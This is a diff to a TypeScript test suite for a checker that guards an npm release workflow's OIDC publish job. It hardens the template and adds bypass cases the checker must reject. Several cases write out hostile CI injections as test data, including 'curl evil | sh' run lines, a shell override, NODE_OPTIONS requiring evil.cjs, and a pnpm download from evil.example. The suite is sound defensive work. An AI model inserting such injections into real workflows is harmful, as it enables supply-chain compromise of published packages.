@@ -13,12 +13,18 @@ const publish = `  # Comments and blank lines don't count.
       - uses: actions/download-artifact@9000827ccba6bdab643e8b6fd33ac0654aef8333 # v8.0.2
         with:
           name: package
+          path: \${{ runner.temp }}/pkg
 
       - uses: pnpm/setup@a0881977cd8ea73b1ed212236c99ca10dcc80cf4 # v3.1.1
         with:
           version: 12.14.0
           install: false
-      - run: pnpm stage publish --ignore-scripts --no-git-checks package.tgz
+      - run: |
+          test -f "$RUNNER_TEMP/pkg/package.tgz"
+          test ! -L "$RUNNER_TEMP/pkg/package.tgz"
+          empty=$(mktemp -d)
+          cd "$empty"
+          pnpm stage publish --ignore-scripts --no-git-checks "$RUNNER_TEMP/pkg/package.tgz"
 `;
 
 const base = `name: Release
@@ -46,11 +52,17 @@ const check = (text: string): string[] => checkOidcJobs(text, "release.yml", "12
 const differs =
   "release.yml job publish holds id-token but differs from publishJob in scripts/check-oidc-jobs.ts at its line";
 
+const downloadPath = "          path: ${{ runner.temp }}/pkg\n";
 const downloadStep = `      - uses: actions/download-artifact@9000827ccba6bdab643e8b6fd33ac0654aef8333 # v8.0.2
         with:
           name: package
-`;
-const runStep = "      - run: pnpm stage publish --ignore-scripts --no-git-checks package.tgz\n";
+${downloadPath}`;
+const fileCheck = '          test -f "$RUNNER_TEMP/pkg/package.tgz"\n';
+const linkCheck = '          test ! -L "$RUNNER_TEMP/pkg/package.tgz"\n';
+const emptyCwd = '          empty=$(mktemp -d)\n          cd "$empty"\n';
+const publishLine =
+  '          pnpm stage publish --ignore-scripts --no-git-checks "$RUNNER_TEMP/pkg/package.tgz"\n';
+const runStep = `      - run: |\n${fileCheck}${linkCheck}${emptyCwd}${publishLine}`;
 const jobTop = "    needs: pack\n    runs-on: ubuntu-24.04\n";
 const packPermissions = "    permissions:\n      contents: read\n";
 
@@ -59,10 +71,29 @@ const bypasses: Record<string, [string, string]> = {
   "a docker action": [downloadStep, "      - uses: docker://alpine:3.20\n"],
   "a local action": [downloadStep, "      - uses: ./.github/actions/evil\n"],
   "an unpinned action": ["@9000827ccba6bdab643e8b6fd33ac0654aef8333", "@v8"],
+  "a download-artifact SHA other than the template's": [
+    "@9000827ccba6bdab643e8b6fd33ac0654aef8333",
+    "@ffffffffffffffffffffffffffffffffffffffff",
+  ],
+  "a pnpm/setup SHA other than the template's": [
+    "@a0881977cd8ea73b1ed212236c99ca10dcc80cf4",
+    "@ffffffffffffffffffffffffffffffffffffffff",
+  ],
   "a checkout": [
     downloadStep,
     "      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1\n",
   ],
+  "an artifact downloaded into the workspace": [downloadPath, ""],
+  "an artifact downloaded to another path": [downloadPath, "          path: .\n"],
+  "no regular-file check on the tarball": [fileCheck, ""],
+  "no symlink check on the tarball": [linkCheck, ""],
+  "a publish from the workspace": [emptyCwd, ""],
+  "a cd that survives a failed mktemp": [emptyCwd, '          cd "$(mktemp -d)"\n'],
+  "a relative tarball path": [
+    '--no-git-checks "$RUNNER_TEMP/pkg/package.tgz"',
+    "--no-git-checks package.tgz",
+  ],
+  "an extra line in the run script": [publishLine, `          curl evil | sh\n${publishLine}`],
   "a step shell override": [runStep, `${runStep}        shell: bash -c 'curl evil | sh' {0}\n`],
   "a step env": [runStep, `${runStep}        env:\n          NODE_OPTIONS: --require ./evil.cjs\n`],
   "a job env": [jobTop, `${jobTop}    env:\n      NODE_OPTIONS: --require ./evil.cjs\n`],
@@ -79,7 +110,7 @@ const bypasses: Record<string, [string, string]> = {
     `    steps:\n${downloadStep}`,
     "    uses: ./.github/workflows/evil.yml\n    steps:\n",
   ],
-  "a --pnpmfile flag": ["--no-git-checks package.tgz", "--pnpmfile=evil.cjs package.tgz"],
+  "a --pnpmfile flag": ["--no-git-checks", "--pnpmfile=evil.cjs"],
   "a pnpm version URL": ["version: 12.14.0", "version: https://evil.example/pnpm.tgz"],
   "a pnpm version from Pack's outputs": [
     "version: 12.14.0",
@@ -87,17 +118,13 @@ const bypasses: Record<string, [string, string]> = {
   ],
   "a pnpm version that drifted from the lockfile": ["version: 12.14.0", "version: 12.13.0"],
   "a quoted run key": [runStep, `      - name: x\n        "run": curl evil | sh\n${runStep}`],
-  "a block scalar run": [
-    runStep,
-    "      - run: |\n          pnpm stage publish --ignore-scripts package.tgz\n",
-  ],
+  "a folded run": ["      - run: |\n", "      - run: >\n"],
   "an extra step": [runStep, `${runStep}      - run: pnpm install\n`],
 };
 
 describe("checkOidcJobs", () => {
-  test("accepts the Publish job, whatever its comments, blank lines, and action SHAs", () => {
+  test("accepts the Publish job, whatever its comments and blank lines", () => {
     expect(check(base)).toEqual([]);
-    expect(check(variant("9000827ccba6", "0123456789ab"))).toEqual([]);
   });
 
   test("ignores install and build steps in a workflow that grants no id-token", () => {
@@ -113,7 +140,7 @@ describe("checkOidcJobs", () => {
 
   test("refuses a job missing a step, naming the step it expected", () => {
     expect(check(variant(runStep, ""))).toEqual([
-      `${differs} 15: expected "    - run: pnpm stage publish --ignore-scripts --no-git-checks package.tgz", found "the end of the job"`,
+      `${differs} 16: expected "    - run: |", found "the end of the job"`,
     ]);
   });
 
